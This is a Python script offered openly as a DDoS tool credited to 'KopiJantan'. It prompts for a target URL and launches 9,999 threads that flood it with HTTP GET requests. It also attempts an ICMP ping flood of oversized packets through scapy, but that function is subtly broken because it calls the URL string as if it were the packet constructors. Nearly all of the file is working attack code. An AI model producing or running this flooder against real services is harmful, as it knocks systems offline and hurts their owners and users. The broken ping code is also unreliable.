print("==================================================================")
print("+ _____________                    _____________                 +")
print("+ ___  __ \__(_)_______      __    ___  __ \__(_)_______      __ +")
print("+ __  /_/ /_  /_  _ \_ | /| / /    __  /_/ /_  /_  _ \_ | /| / / +")
print("+ _  ____/_  / /  __/_ |/ |/ /     _  ____/_  / /  __/_ |/ |/ /  +")
print("+ /_/     /_/  \___/____/|__/      /_/     /_/  \___/____/|__    +")
print("+                                                                +")
print("+================================================================+")
print("")
print("[DDOS tools created by KopiJantan] | (April 2023) [Use At Your Own Risk]")
print("")
print("")
print("[-]Tembak Jangan Tak Ditembak!!!")
print("")
print("")
import requests
import threading
import signal
from scapy.all import *

user_url = input('[<>] Enter Your Targeted URL !!! :')
stop_processing = False

def send_request():
    global stop_processing
    while not stop_processing:
        try:
            response = requests.get(user_url)
            print(response.status_code)
        except:
            pass

def send_ping(user_url: str, number_of_packets_to_send: int = 100, size_of_packet: int = 65000):
    ip = user_url(dst=user_url)
    icmp = user_url()
    raw = Raw(b"X" * size_of_packet)
    p = ip / icmp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + user_url)

def start_threads():
    global stop_processing
    threads = []
    for i in range(9999):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()

    # Register SIGINT signal handler
    signal.signal(signal.SIGINT, lambda sig, frame: stop_processing_func())

    # Call the send_ping() function with appropriate arguments
    send_ping(user_url=user_url, number_of_packets_to_send=100, size_of_packet=65000)

    # Stop the threads when processing is done
    stop_processing = True

def stop_processing_func():
    global stop_processing
    stop_processing = True

# Ask user whether to start processing or not
start = input("[?] Do you want to start processing? (y/n): ")
if start.lower() == 'y':
    # Start processing
    t = threading.Thread(target=start_threads)
    t.start()

    # Wait for user input to stop processing
    input("[!] Press Enter to stop processing")

    # Stop processing
    stop_processing_func()
else:
    # Do nothing
    print("[!] Processing not started") 
